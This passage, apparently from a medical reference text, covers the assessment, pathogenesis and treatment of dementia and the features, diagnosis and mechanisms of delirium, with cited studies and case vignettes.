The patient appears alert, but apathetic and somewhat agitated, and is seen to be twisting her fingers through her hair. Her speech is fluent and well-articulated, but she uses many long, meaningless phrases (such as, &quot;The thing of it is, you see, I need the thing to be, you know, whatever.&quot;). She is oriented to year, but not the month or day. She recalls only 1 of three named items, after a three minute interval of distraction. She cannot remember the names of the college from which she graduated, and gave an incorrect response when asked, &quot;Who is the current president of the U.S.?&quot; When shown a picture of a cup, she calls it a &quot;vase&quot;, and identifies the examiner’s stethoscope as a &quot;hearing aid.&quot; She is able to subtract 10 from 100 correctly, but cannot do serial 10’s accurately (&quot;90, 85, 75, 65, 50, 40…&quot;). She produces a poorly-constructed drawing when asked to copy a cube, and her drawing of a clock reading &quot;ten past two&quot; was incorrect (with the big hand placed at the &quot;10&quot; position). When asked to interpret the proverb, &quot;The early bird catches the worm,&quot; her response is very concrete (&quot;The bird that gets up early will catch the worm.&quot;). When asked if she has any particular fears lately, she replies, &quot;I don’t know what the neighbors think of me, but I know they steal from my bedroom&quot; (Spitzer et al. 1994). 
* Screening instruments and  neuropsychological assessments
      
The most widely-used screening instrument for dementia is the Mini-Mental State Exam (MMSE) developed by Folstein ( Folstein et al. 1975), an 11-item test that evaluates orientation, registration, attention and calculation, recall, and language. The maximum score on the MMSE is 30 and—depending on age and education--a score of 28 or higher is usually considered &quot;normal.&quot; A &quot;low normal&quot; score (24 or higher) appears to predict development of dementia after three years (Braekhus et al. 1995). The MMSE does not specifically examine executive cognitive function. An expanded version of the MMSE (the 3MS) does include some executive function items, and may be more sensitive, specific and predictive of functional outcome than the MMSE (Grace et al. 1995). Neither the MMSE nor the 3MS is ideally suited to detecting features of &quot;milder&quot; or subcortical dementia, or detecting impairments in social or operational functioning. For HIV-related dementia, the HIV dementia scale or the Mental Alternation Test may be better alternatives (van Harten et al. 2004; Billick et al. 2001). More complete neuropsychological assessment of dementia usually includes use of the Wechsler Adult Intelligence Scale-III (WAIS-III), the Wechsler Memory Scale (WMS), the Rey Complex Figure, and Trail Making Test (Howieson &amp; Lezak, 2008), among others. These ancillary tests may be helpful in pinpointing specific functional impairments and their neuroanatomical correlates. 
      
* Neuroimaging studies

Neither the ICD-10 nor the DSM-IV criteria for dementia require any corroborative evidence obtained from neuroimaging studies. Nevertheless, neuroimaging techniques such as magnetic resonance imaging (MRI) or positron emission tomography (PET) may be helpful in clarifying diagnosis and ruling out other types of brain disease, such as normal pressure hydrocephalus. Indeed, the American Academy of Neurology recommends a non-contrast structural image (CT or MRI) in the initial evaluation of cognitive impairment (Apostolova &amp; Cummings, 2008). With DAT, global cerebral atrophy, especially in mesial temporal and parietal regions, is the usual finding on CT or MRI. On PET or SPECT (single-photon emission computed tomography), DAT patients usually show bilateral hypometabolism in mesial temporal and parietal regions. Recently, a novel radio-labeled PET imaging agent, 18F-AV-45, has been developed, and may eventually provide a practical approach for routine brain imaging for Alzheimer's Disease (Alzheimer’s Association, 2008). 
      
In dementia with Lewy Bodies (DLB), bilateral parietal and occipital hypoperfusion is seen. The latter helps distinguish DLB from DAT, and may explain the high prevalence of visual hallucinations in DLB. Structural imaging (CT, MRI) is not helpful in diagnosing DLB (Lerner &amp; Riley, p. 919). In frontotemporal dementia (FTD), the expected hypometabolism is seen in frontotemporal regions, using PET scanning (Apostolova &amp; Cummings, 2008). Structural imaging (such as MRI) shows distinct profiles for the three main subtypes of FTD, though some degree of frontal and/or temporal lobe involvement is seen in all three subtypes.
      
In vascular dementia, both CT and especially MRI can be useful in defining cortical and white matter abnormalities.  In multi-infract or lacunar states, evidence of prior infarct can be seen. In SAE, periventricular white matter abnormalities can frequently be seen, although limited periventricular abnormatilies just anterior or proximal to the lateral ventricle can also be seen in normal aging.  Periventricular abnormalities of greater size or distance from the ventricles, or extending into the centrum semiovale, are more likely to represent evidence of clinically significant disease.  
* Investigational Biomarkers
      
Given the uncertainties of early dementia diagnosis, there has been great interest in a &quot;blood test&quot; or other valid biomarker for DAT, the most common type of dementia. Recently, for example, researchers in Germany found differences in levels of CD-69, a protein involved in white blood cell growth and production, in normal subjects versus those with DAT or Parkinson's-related dementia (Alzheimer’s Association, 2008). Irish researchers have focused on the enzyme beta-secretase (BACE1) activity in the brain. (BACE1 is one of two enzymes involved in the pathological processing of amyloid precursor protein (APP)—see below, under Pathogenesis).   High levels of BACE1 in the spinal fluid appear to be correlated with development of DAT. At present, these remain promising, but only investigational, techniques (Alzheimer’s Association, 2008).

=== Pathogenesis of Dementias ===

* Biogenetic determinants and pathophysiology

Dementia of the Alzheimer Type
	
From the biogenetic standpoint, Alzheimer’s Disease (DAT) appears to be of two main types: late-onset (sporadic) and early-onset. When DAT begins after age 65 (late onset), its mode of inheritance appears to involve a constellation of genes, probably influenced by epigenetic factors (i.e., influences that do not change DNA sequence) such as diet and exercise. However, increasing age is the most important risk factor, with rates of DAT rising to 40% in those 85 years or older. Increasing age acts synergistically with the apolipoprotein E (APOE) gene polymorphism on chromosome 19. The APOE gene takes three major forms (alleles), termed ApoE2, ApoE3, and ApoE4. APOE4 (E4) greatly increases the likelihood of late-onset DAT; i.e., individuals with two E4 genes develop DAT eight times more frequently than do those with no E4 gene. (Sadock and Sadock, 2007 p. 330; Apostolova &amp; Cummings, 2008). It appears that E4 promotes aggregation of amyloid ? (A?), which leads to a variety of pathological changes in brain tissue (see below). 
   
In early-onset DAT, instead of—or possibly in addition to—APOE4, three autosomal dominant mutations appear to be important: the APP gene mutation on chromosome 21; the presenilin-1-gene mutation on chromosome 14; and the presenilin-2 gene mutation on chromosome 1. As noted above, early-onset DAT may be associated with atypical features, as well as shorter survival time (Apostolova &amp; Cummings, 2008).   
   
The classic pathological findings in DAT is the presence of senile plaques, neurofibrillary tangles, neuronal and synaptic loss, and granulovascular degeneration of neurons (Sadock &amp; Sadock, 2007, p. 330). The pathophysiology of DAT is integrally related to the over-production or accumulation of amyloid ? (A?). The &quot;amyloid cascade hypothesis&quot; of DAT posits that abnormal enzymatic processing of beta-amyloid precursor protein (?APP) leads to overproduction of neurotoxic A? peptides. These abnormal peptides polymerize (form chains) and &quot;clump together&quot;, forming several types of destructive, extracellular inclusion bodies called plaques. The first plaques appear in temporal-occipital association regions in patients with DAT. In addition, DAT may involve abnormal phosphorylation of a structural protein called tau, which is involved in microtubulular transport—the intracellular &quot;highway system&quot; that transports vital constituents within neurons (Apostolova &amp; Cummings, 2008). In DAT, hyper-phosphorylated tau forms distructive intracellular inclusions called neurofibrillary tangles (NFTs).  Together, these plaques and tangles &quot;choke off&quot; normal neuronal function and neurotransmitter production in DAT, particularly affecting the production of acetylcholine (ACh) and norepinephrine. Degeneration of cholinergic neurons is present in the nucleus basalis of Meynert in persons with DAT, and low brain levels of ACh and choline acetyltransferase are also found. Cholinergic deficits provide the rationale for use of cholinesterase inhibitors in the treatment of DAT (see below, Treatment). In addition, overactivation of NMDA receptors by the excitatory neurotransmitter, glutamate, is believed to play a role in DAT, and is the basis for one pharmacological treatment (see below re: memantine). Recently, it was discovered that elevated serum levels of amyloid ? are associated with reduced cognitive function even in healthy older adults, similar to patterns observed in early DAT (Gunstad et al. 2008). 
   
Vascular Dementia 
   	
VaD is caused by cumulative ischemic or hemorrhagic brain damage, usually secondary to cerebrovascular and cardiovascular pathology, and is often seen in association with hypertension, diabetes and hyperlipidemia (Apostolova &amp; Cummings, 2008). There are somewhat conflicting data regarding the contribution of the ApoE gene to the pathogenesis of VaD, but any such contribution appears smaller than that in DAT (Higuchi et al. 1996). 
   
Multi-infarct dementia (MID)—the older term for VaD—usually involves infarcts in the territory of the middle cerebral artery and surrounding (&quot;watershed&quot;) regions. The middle cerebral artery is the largest cerebral artery and is the vessel most commonly affected by cerebrovascular accident. It supplies most of the outer convex brain surface, nearly all the basal ganglia, and the posterior and anterior internal capsules (Slater, 2008). In VaD, infarcts are also seen in the basal ganglia and periventricular white matter.
    
Subacute Arteriosclerotic Encephalopathy (SAE) and Lacunar state both involve the small vessels of the brain. SAE is caused by thickening and narrowing (arteriosclerosis) of arteries that feed subcortical areas of the brain. SAE produces widespread, microscopic areas of damage to the deep layers of white matter. (NINDS, 2008). Lacunar state (lacunar disease) is due to occlusion of small, penetrating cerebral arteries, leading to  extremely small but deep infarctions (lacunes). Sometimes, these lacunes are so small as to produce no obvious deficits, or only pure motor or sensory deficits (Robinson &amp; Starkstein, p. 707). Lacunar state is often associated with hypertension and/or diabetes. The cavitary lesions (lacunae) characteristic of this condition are often found in the internal capsule, deep grey matter nuclei, and white matter. 
   
Cerebral autosomal dominant arteriopathy with subcortical infarcts and leucoencephalopathy (CADASIL) is a rare, hereditary type of VaD that affects small blood vessels in the brain. An abnormality in the muscle cells surrounding these blood vessels gradually destroys the blood vessel cells. This may lead to migraines, emotional disturbance, stroke-like episodes, dementia, and other impairments (CADASIL Foundation, 2008).  CADASIL involves mutations of the Notch 3 gene on chromosome 19 (Joutel et al. 1996). There are also a growing number of genetically uncharacterized but familial small vessel diseases (Low et al. 2007). 
   
Dementia with Lewy Bodies (DLB)
   	
DLB does exist in genetic forms, including some autosomal dominant forms (Lerner &amp; Riley, p. 919).  There is significant pathophysiological overlap between DLB and Parkinson’s Disease (PD), on the one hand; and DLB and SDAT, on the other. Thus, alpha-synuclein is a protein that appears to modulate synaptic transmission, and constitutes the major component of Lewy bodies. These structures are the pathological hallmark of both PD and DLB, whether of a sporadic or familial origin (Lerner &amp; Riley, p. 914). 
   
There is considerable overlap between DLB and DAT. For example, neuritic plaques and neurofibrillary tangles are seen in autopsy studies of both DAT and DLB, though fewer neurofibrillary tangles are found in DLB (Samuel et al. 1997). Moreover, amyloid ? (A?) pathology—one of the hallmarks of DAT—is often seen in DLB. Indeed, there is an interesting synergy between pathophysiological elements of DLB and DAT. For example, alpha- synuclein is a potent inducer of tau fibrillization, while A?  has been shown to promote Lewy body pathology in animal models (Giasson et al. 2003; Masliah et al. 2001). 
   
Fronto-temporal dementia 
   
There appears to be a strong genetic loading in FTD. About 40% of FTD patients have a family history of a similar disorder in close relatives, and in the vast majority of cases, there is an autosomal dominant inheritance pattern. Autosomal dominant mutations in the tau gene on chromosome 17 have been discovered in FTD, and—like DAT-- FTD is generally considered a &quot;tauopathy.&quot; However, &quot;tau-negative&quot; forms of FTD have been described, including one form that often presents with concomitant amyotrophic lateral sclerosis (ALS) (Apostolova &amp; Cummings, 2008; Lantos &amp; Cairns, 2001). 
   
Pick’s Disease (frontal variant FTD) produces striking frontal, temporal, or combined (fronto-temporal) atrophy. Microscopically, the hallmark are  spherical, tau-based inclusion bodies, termed Pick’s bodies, which may be seen in neurons and glial cells. Neuronal loss and swelling are also commonly seen in Pick’s Disease. In tau-negative forms of FTD, neuronal loss, gliosis, and microvacuolation are the sole microscopic findings. 

* Ethno-cultural and racial factors in dementia

Ethnic, cultural, and racial factors play a role in the assessment of dementia and, to some extent, on its course and outcome. For example, most diagnostic tests for dementia are based on cognitive assessments not yet validated for various ethnic groups. Moreover, emigration of some ethnic groups may affect dementia prevalence, as demonstrated by higher rates of dementia among Japanese-Americans than among Japanese cohorts in Japan (Iliffe &amp; Manthorpe, 2004). Ethnic and cultural factors may also affect caregiver attitudes and behavior. For example, Latina dementia caregivers may delay institutionalization significantly longer than female Caucasian caregivers, perhaps reflecting more tolerant Latino cultural attitudes toward caregiving (Mausbach et al. 2004). Similarly, Shaw et al. (1997) found lower rates of depressive symptoms in Chinese, as compared with American, caregivers of demented patients, possibly reflecting greater acceptance of traditional family roles among the Chinese subjects. Finally, ethnicity and race may play a role even in the symptomatic expression of dementia, with different ethnic and racial groups showing varying rates of aggressive behaviors, wandering, and hallucinations (Sink et al. 2004).

=== Treatment of Dementias ===

==== Pharmacotherapy ====

By far the most experience with pharmacotherapy has been in patients with DAT, and our discussion necessarily focuses on this condition. The mainstay of drug therapy in dementia is a group of agents called cholinesterase inhibitors (CIs), including donepezil, galantamine, and rivastigmine. (Another CI, tacrine, is rarely used nowadays in most industrialized countries, owing to its hepatotoxic effects). Comprehensive discussion of these agents may be found in Jacobson et al. 2007. All CIs act to inhibit the enzyme acetylcholinesterase, which metabolizes the neurotransmitter, acetylcholine. Rivastigmine also inhibits butyrylcholinesterase, and galantamine is an allosteric modifier of the nicotinic acetylcholine receptor. There is no convincing, randomized, controlled evidence showing any one of these drugs as markedly superior to the others. Indeed, the efficacy of this group of agents appears to be modest-to-moderate, with most studies of DAT finding that the CIs mainly slow the rate of cognitive decline and/or delay nursing home placement.  One meta-analysis of 13 randomized, double blind, placebo controlled trials demonstrated that 6-12 months of treatment with donepezil, galantamine or rivastigmine in mild, moderate or severe DAT produced about a 3 point drop in scores on the 70-point ADAS-Cog Scale. Benefits were also seen on measures of activities of daily living and behavior. But as the authors note, &quot;none of these treatment effects (is) large.&quot; (Birks, 2006). The other drug used in most countries for DAT is memantine, which blocks the action of glutamate at the NMDA receptor, under conditions of excessive glutamate activity (Jacobson et al. 2007). This is thought to slow neurodegeneration in DAT, and there is evidence of memantine’s benefits in moderate-to-severe DAT. In some instances, memantine may be combined with one of the CIs, but long-term data on outcome are few. 
      
Although atypical antipsychotics are often used—and sometimes, overused—in patients with DAT, they are not without risk in dementia-prone populations, particularly when vascular risk factors are present. In the U.S., the Food &amp; Drug Administration (FDA) issued, in June 2008, an advisory to physicians, stating the following (FDA, Alert, 6/16/08):
      
*  Elderly patients with dementia-related psychosis treated with conventional or atypical antipsychotic drugs are at an increased risk of death.
      
* Antipsychotic drugs are not approved for the treatment of dementia-related psychosis.  Furthermore, there is no approved drug for the treatment of dementia-related psychosis.  Healthcare professionals should consider other management options.
      
* Physicians who prescribe antipsychotics to elderly patients with dementia-related psychosis should discuss this risk of increased mortality with their patients, patients’ families, and caregivers.

Notwithstanding these serious concerns, some patients with DAT and psychotic features and/or severe behavioral disturbance (e.g., extreme agitation or aggressive violence) may require and benefit from low doses of atypical antipsychotics; e.g., risperidone 0.5 mg/day or olanzapine 5 mg/day (Alexopoulos et al. 2004).  However, attempts at behavioral modification (see below) and alternative therapies (such as the SSRI citalopram) should be considered (Pollock et al. 2007). As a recent review by Ellison (2008) put it: 
   
“…several of the atypical antipsychotics remain reasonable choices when used in patients whose vascular risk factors do not outweigh their behavioral treatment needs. The atypical antipsychotics have not been proved to control agitation over an extended period of time and should be used at the lowest effective doses and for the shortest interval necessary, with sufficient psychoeducation and disclosure of risks to caregivers and relatives.”
   
Treatment of vascular dementia (VaD) should first focus on mitigation of known risk factors, such as hypertension, diabetes, atrial fibrillation, and hyperlipidemia. Studies regarding use of CIs for vascular dementia are plagued by methodological problems, such as inclusion of those whose dementia probably involves some DAT-type pathology and cholinergic system dysfunction; nonetheless, there is modest and growing evidence that the CIs may be helpful in subgroups of patients with VaD. Similarly, Dementia with Lewy Bodies (DLB) also involves reduction of brain acetylcholine—perhaps surpassing those seen in DAT--and the CIs may sometimes be useful in DLB (Jacobson et al. 2007). Patients with DLB are exquisitely sensitive to the extrapyramidal side effects of antipsychotics, and both typical and atypical agents (with the possible exception of clozapine) are generally to be avoided in DLB patients.

==== Psychosocial and behavioral interventions ====

Whenever possible, the clinician should initiate non-pharmacological interventions when managing behavioral disturbances in patients with dementia. Such behavioral approaches are aimed at ameliorating physical, environmental and psychosocial stressors that may lead to agitation, pacing, aggression, and related behavioral disturbances (Salzman et al. 2008). For example, dysfunctional verbal and physical behaviors—such as repetitive shouting, pacing, punching, etc.—may reflect unrecognized pain, loneliness, depression, boredom, or other social stressors. A variety of behavioral interventions may be helpful in this context; e.g., structured socialization, &quot;pet therapy,&quot; viewing family videotapes, and training programs for family caregivers. It is also important to review the patient’s medical status and medications, since adverse drug effects or interactions may sometimes contribute to confusion and agitation (Jacobson et al. 2007; Salzman et al. 2008). There are relatively few well-controlled studies of non-pharmacological interventions in dementia; nevertheless, a number of promising investigational approaches are under investigation, including aroma therapy and music therapy (Raglio et al. 2008). 

''Special Populations''

There are several subgroups of demented patients who merit special attention and interventions. Patients with HIV-related dementia in the late stages, for example, may exhibit behavioral disinhibition, mania, and psychotic features, such as delusions and hallucinations. Primary treatment of HIV/AIDs is aimed at suppression of viral load by means of anti-retroviral therapies. Some evidence suggests that the nucleoside analog reverse transcriptase inhibitor (NRTI) zidovudine (also known as AZT) may attenuate the symptoms of HIV-related dementia and neurological impairment in some patients; however, zidovudine and related agents may themselves provoke neuropsychiatric complications, such as depersonalization, mania, and delirium (Fernandez &amp; Tan, 2008). Cognitive functioning in HIV dementia patients may be improved by methylphenidate; psychotic symptoms may respond to atypical antipsychotics, such as risperidone or olanzapine. Depression in HIV/AIDS is not uncommon, but may stem from a complex mix of direct effects of HIV on the CNS, and psychosocial factors. 
      
Antidepressants such as citalopram and escitalopram may be useful, but this patient population is particularly susceptible to drug-related side effects and interactions. Thus, any pharmacotherapy aimed at neuropsychiatric symptoms must be very carefully monitored in this population (Fernandez &amp; Tan, 2008).
      
As noted above, Dementia with Lewy Bodies (DLB) poses particular management problems. Psychotic symptoms, including visual hallucinations, are a central feature of DLB, and the sensitivity of these patients to antipsychotics makes treatment especially challenging. Cholinesterase inhibitors, such as rivastigmine, may ameliorate some neuropsychiatric symptoms in DLB patients, including hallucinations, paranoid delusions, apathy, aggression, and agitation (Simard &amp; van Reekum, 2004; Apostolova &amp; Cummings, 2008). If an antipsychotic must be used in DLB with psychosis, classic neuroleptics should be avoided; initiating treatment with very low doses of quetiapine or clozapine is sometimes warranted (Jacobson et al. 2007). 
      
Depression as a feature of dementia represents a diagnostic and treatment challenge. As noted earlier, depression is commonly seen in patients with Parkinson’s Disease, Huntington’s Disease, DAT, and LBD, as well as in those with a history of stroke or other form of VaD. Depression may represent a prodrome to dementia or a feature of established dementia. The recently described amyloid-associated depression may represent such a prodome in DAT (Qiu et al. 2008).  Vascular depression (Sneed et al. 2008; Alexopolous, 2006) may present as new-onset of depressive illness in those affected by diffuse or focal vascular lesions, and is increasingly recognized in older individuals. Conversely, the &quot;dementia of depression&quot; (formerly called depressive pseudodementia) is a reversible cognitive impairment directly related to the patient’s mood disorder. Features such as excessive guilt, low self-esteem, self-loathing, or persistent suicidal ideation, as well as delayed responses to cognitive questions, are useful &quot;red flags&quot; for the presence of depression in dementia. The Cornell Scale for Depression in Dementia may be helpful in detecting this problem. Depressed patients with dementia often respond to lower doses of antidepressants (such as citalopram or sertraline) than do non-demented depressed patients (Jacobson et al. 2007).  
      
Delirium is a common complication of both HIV-related dementia and DLB, and is discussed in the section on Delirium. Co-morbid dementia and delirium is also discussed in the section on Delirium. 
Case Vignette: Mr. J. was a 78-year-old nursing home patient with dementia of the Alzheimer type (DAT). The staff were concerned and distressed by Mr. J’s frequent &quot;moaning&quot; or &quot;yelling,&quot; particularly in the evening, and believed these behaviors were adversely affecting the other residents of the home. Mr. J. was prescribed risperidone 1.0  mg at h.s. His yelling diminished after only two days of treatment. However, he developed significant orthostatic  hypotension and akathisia, and continued to &quot;moan&quot; nearly every night. A comprehensive medical evaluation revealed that Mr. J. suffered from severe osteoarthritis, which was worsened with attempts by the &quot;night shift&quot; nurses to reposition Mr. J. in his bed. A combination of acetaminophen and local heat application led to considerable relief and marked reduction in Mr. J’s verbal outbursts.   
Risperidone was reduced to 0.25 mg at h.s., with significant improvement in Mr. J’s akathisia and hypotension.

== Delirium ==

=== Phenomenology (Characteristic Features of Delirium) ===

Delirium may be defined as an acute or subacute disturbance in cerebral functioning leading to impairment in one’s level of consciousness, orientation, memory, and attention, usually characterized by &quot;waxing and waning&quot; over hours or days. Common accompaniments of delirium include altered sleep-wake pattern; labile mood; speech disturbance; restlessness or agitation; perceptual abnormalities; and sometimes, psychotic features. Older terms for delirium include &quot;acute organic brain syndrome,&quot; &quot;cerebral insufficiency,&quot; and &quot;acute confusional state.&quot; Not uncommonly, delirium may be superimposed on dementia, a condition sometimes termed &quot;beclouded dementia&quot; (Sadock &amp; Sadock, 2007). 
   
=== Epidemiology ===

Delirium is a very common problem, particularly in emergency, medical-surgical, inpatient, and geriatric settings, such as nursing homes (Levkoff et al. 1991). Substance-abuse and oncology treatment centers also have high rates of delirium (Tasman et al. 1998). Among medical inpatients, the prevalence of delirium ranges from 11-16%, while among elderly patients admitted for acute hospital care, the prevalence ranges from 24-65%. Among elderly patients over age 65, hospitalized for a general medical condition, 10-15% will develop delirium while in the hospital. In general delirium tends to be more common among the very young and the very old, but can affect anyone at any age. Delirium is associated with longer hospital length of stay and mortality in medical surgical inpatients.
   
Subtypes of Delirium and Classification
   
Delirium is sometimes characterized according to the predominant disturbance in motor behavior; i.e., as excited (&quot;hyperactive&quot;), lethargic (&quot;hypoactive&quot;) or mixed delirium (Trzepacz &amp; Meagher, 2008). Some evidence indicates that these motor subtypes have implications for etiology, pathophysiology, presence of non-motor symptoms, and prognosis. Thus, some evidence suggests that patients with hyperactive delirium may have a better prognosis and a lower mortality rate. Hypoactive delirium may be more likely to go undetected, as one might expect from the lack of obvious agitation. However, the definition of these subtypes varies considerably among clinicians and researchers, and their reliability has been questioned. 
Another way of considering delirium is expressed by the terms &quot;excitatory&quot; and &quot;inhibitory&quot; syndromes, which we will discuss under Pathogenesis (Ferner, 2003). 
      
Delirium with psychotic features—including delusional misidentification and hallucinations—may be particularly distressing to the patient, even after resolution of the delirium (Trzepacz &amp; Meagher, 2008). 
	
There are several ways delirium may be classified. In the ICD-10 (1993), the main categories are:
* Delirium, Not Induced By Alcohol And Other Psychoactive Substances 
* Delirium, Not Superimposed On Dementia,  
* Delirium, Superimposed On Dementia 
* Other Delirium 
   
In contrast, the DSM-IV categorizes delirium according to four very broad etiologies: delirium due to general medical condition; substance intoxication delirium; substance withdrawal delirium; and delirium due to multiple etiologies. 
   
The number of general medical conditions (GMCs) causing delirium is legion. Some common GMCs include fluid and electrolyte abnormalities, hypoglycemia, infection or sepsis, head trauma, hepatic encephalopathy, viral encephalitis, renal failure, COPD and brain tumor or hemorrhage. A plethora of both prescribed and over-the-counter medications can provoke delirium, including analgesics, antibiotics, cardiac medications, anticholinergic agents, psychotropic agents, and a variety of botanicals, such as jimsonweed. (Sadock &amp; Sadock, 2007)

Case vignette: An 84 year-old woman with a history of mild congestive heart failure, osteoarthritis, and moderate cognitive impairment thought possibly due to very early DAT appeared confused, disoriented, and hallucinating. She complained of seeing &quot;green faces&quot; and was initially diagnosed as &quot;psychotic.&quot; Physical exam and routine laboratory measures were within normal limits. Her regular medication included digoxin 0.25 mg/day (digoxin level = 0.6 ng/ml; therap=0.5-2.0). Owing to her arthritic pain, she recently had been started on ibuprofen 400 mg tid.
A repeat digoxin level shortly after admission showed the level to be 1.2 ng/ml (WNL). An EEG showed slowing of alpha rhythm (7-8 Hz, normal=8-12). The increase in digoxin levels was attributed to the effect of the NSAID, ibuprofen (Goldfrank, 2002). Though the absolute level of digoxin was still within the normal range, its doubling  within a short period of time evidently set off the patient’s confusion. Abnormal color perception—particularly in the green or yellow end of the spectrum (xanthopsia)—is a classic sign of digoxin toxicity (Piltz et al. 1993).

=== Assessment and Diagnostic Testing ===

Delirium remains a clinical diagnosis, with a careful history, physical exam, mental status exam, and review of medication and laboratory findings as the most useful diagnostic &quot;instruments&quot; (Sadock &amp; Sadock, 2007).  Typically, the onset of delirium is acute (over a period of hours, days, or in some cases weeks) and there is a marked change from the patient’s &quot;baseline&quot; cognitive state. A recent change in medication; recent substance abuse/discontinuation; or some recent medical or neurological event (fall, infection, stroke, etc.) may provide the critical historical clues. The classic findings on mental status include a fluctuating level of consciousness (e.g., the patient &quot;nods off&quot; or drifts in and out of awareness); inability to pay attention to the examiner; disorientation to date and place (though intact orientation does not rule out delirium); impaired recent memory (e.g., inability to recall 3 of 3 items after 5 minutes); and associated features, such as disorganized thought processes (tangentiality, loose associations), perceptual abnormalities (auditory, and particularly, prominent visual or tactile, hallucinations); and psychomotor abnormalities (agitation, slowing). Affect may be quite labile, and delusions may also be present. 
	
When delirium is superimposed upon dementia, it appears that delirium phenomenology generally overshadows that of the dementia. Thus, delirium tends to present similarly regardless of whether it is accompanied by dementia. The clinical maxim should be, &quot;altered mental status reflects delirium until proven otherwise,&quot; in order to prevent misattribution of delirium to the more chronic brain syndrome of dementia (Trzepacz &amp; Meagher, 2008, p. 451). History from family members or caregivers may provide critical information suggesting a more acute change in functioning.
	
Physical examination may be difficult in an agitated, delirious patient, but every effort must be made to rule out head trauma, acute neurological events, and severe autonomic dysfunction (such as marked hypotension). Pulse, blood pressure, temperature, respirations should all be checked. An examination of the head and neck—including papillary function and extraocular movements—should be carried out. A basic assessment of heart, lungs, and neurological function should be obtained. Specific physical findings may provide a clue as to the etiology of the delirium. For example, a patient with papilledema and hypertension may be experiencing hypertensive encephalopathy; nuchal rigidity may point to meningitis or subarachnoid hemorrhage (Sadock &amp; Sadock, 2007). One helpful clue may be pupillary findings: in cases of anticholinergic toxicity, pupils may be dilated but sluggish; in cases of &quot;hyper-adrenergic&quot; delirium (e.g., in sedative withdrawal, amphetamine/cocaine intoxication, or hyperthyroid storm), pupils may be dilated by briskly reactive (Ferner, 2003). 
	
Adjunctive screening instruments for detecting delirium include the CAM (Confusion Assessment Method); the CTD (Cognitive Test for Delirium); and the DRS-R98 (Delirium Rating Scale, Revised 98). The CAM is probably the most widely used delirium screening test in general hospital settings, and is based on DSM-III criteria (Trzepacz &amp; Meagher, 2008). Recently, Fanjiang &amp; Folstein (2001) developed a simple screening scale for use by medical students, called the Three Item Delirium Scale. This requires the presence of altered consciousness plus either cognitive impairment or hallucinations; preliminary data suggest good sensitivity and specificity for delirium (Trzepacz &amp; Meagher, 2008). 
	
Laboratory measures and ancillary testing: There is no pathognomonic &quot;test&quot; for the diagnosis of delirium. However, it is important to obtain routine laboratory studies on all delirious patients, including—most urgently--complete blood count, electrolytes 
(including calcium, magnesium, and phosphate), renal and hepatic functions (including ammonia), serum glucose and erythrocyte sedimentation rate. Thyroid functions should also be checked. A blood and/or urine screen for drugs of abuse is helpful, and serologic tests for syphilis (such as VDRL) and HIV infection may also be indicated. An electrocardiogram (EKG) and chest radiograph are usually appropriate, in order to rule out cardiac arrhythmia, silent ischemia, or occult pneumonia among other causes. A bedside test for oxygenation is also useful. An electroencephalogram (EEG) is often advised as a standard study in the work up of delirium (Sadock &amp; Sadock, 2007), since the EEG often reveals either generalized slowing or focal areas of hyperactivity. (Serial EEGs may also be helpful in following the &quot;progress&quot; of treatment, in that one may see restoration of normal (8-12 Hz) alpha rhythm as the delirium resolves). Depending upon history and specific medical presentations, ancillary tests, such as lumbar puncture, blood cultures, B12 level, and structural brain imaging (CT, MRI) may be clearly indicated. It is important to note that correction of underlying metabolic, electrolyte, or other abnormalities does not necessarily lead to immediate resolution of the delirium; typically, there is a &quot;lag&quot; between such corrections and the patient’s level of consciousness. This is particularly true in those circumstances where CNS drug levels (e.g., lithium) may normalize more slowly than blood levels; or when correction of blood abnormalities 
(such as high glucose or sodium) needs to occur slowly, in order to prevent CNS complications.  One should treat the patient, not the &quot;lab slip!&quot;

=== Pathogenesis of Delirium ===

Even though delirium may arise from a multitude of underlying causes, several unifying hypotheses have been advanced to explain the general mechanisms of most delirious states (Ferner, 2003). One such hypothesis emphasizes the balance between excitatory and inhibitory neurotransmission in the brain, and derives a broad separation of brain syndromes on this basis. For example, excitatory delirium syndromes may involve excessive augmentation of excitatory neurotransmitters, such as glutamate, dopamine and norepinephrine (serotonin may also be considered excitatory to some degree). Antagonism of certain cholinergic receptors, on this view, also constitutes an &quot;excitatory&quot; effect. Thus, delirium syndromes as diverse as amphetamine toxicity and poisoning with the anticholinergic agent benztropine would be predicted to have similar excitatory effects, including agitation, tachycardia, hypertension and fever. (Anticholinergic syndromes may present with the classic and memorable findings of &quot;hot as a hare, mad as a hatter, red as a beet, dry as a bone;&quot; i.e., fever, agitated confusion or psychosis; red skin; and dry mouth). 
   
Inhibitory delirium syndromes, in Ferner’s view (Ferner, 2003), involve agents that augment the inhibitory neurotransmitter, GABA, or act as agonists at the mu opioid receptor. Thus, in large quantities, GABA agonists such as benzodiazepines (and to some degree, ethanol) or opioids such as morphine may cause delirious states characterized by drowsiness, ataxia, respiratory suppression, and slurred speech. Pathological alterations in GABA activity--perhaps amplified by an endogenous toxin that binds to benzodiazepine receptors--have also been implicated in hepatic encephalopathy (Rummans et al. 1995). In some cases of inhibitory syndromes, &quot;paradoxical&quot; agitation may result from disinhibition of higher brain centers that normally suppress aggression or agitation (Ferner, 2003).
   
Another unifying hypothesis focuses specifically on low cholinergic and high dopaminergic transmission in delirium (Trzepacz &amp; Meagher, 2008),
as well as derangements in non-dominant, posterior parietal and prefrontal cortices. Other brain regions, including the brain stem, basal ganglia and thalamus, are likely to be involved. Importantly for the cholinergic hypothesis, a variety of disease states causing delirium are associated with cholinergic deficiency; e.g., thiamine deficiency, hypoxia, and hypoglycemia all reduce acetylcholine by affecting the oxidative metabolism of glucose and production of acetyl coenzyme-A (Trzepacz &amp; Meagher, 2008). 
   
The pathogenesis of delirium must also consider predisposing medical risk factors, though, as Trzepacz and Meagher note, these must not be confused with causes of delirium. Predisposing factors include but are by no means limited to: genetic risk factors (such as APOE4 genotype); old age; pre-existing cognitive impairment; use of multiple medications (especially anticholinergic agents and opioids); pre-existing cerebrovascular accident/stroke; and vitamin (especially thiamine) deficiency (Trzepacz &amp; Meagher, 2008). 
   
To some degree, psychological factors, as well as quality of hospital care, may also influence certain aspects of delirium. As Mohta et al. (2003) have pointed out, the experience of being in the intensive care or trauma unit may activate various psychological defense mechanisms, such as denial, regression, anger, anxiety and depression. Delirium itself may, in some cases, represent a regressive defense, though  such psychodynamic hypotheses must never vitiate the clinician’s search for specific physiological precipitants. 
   
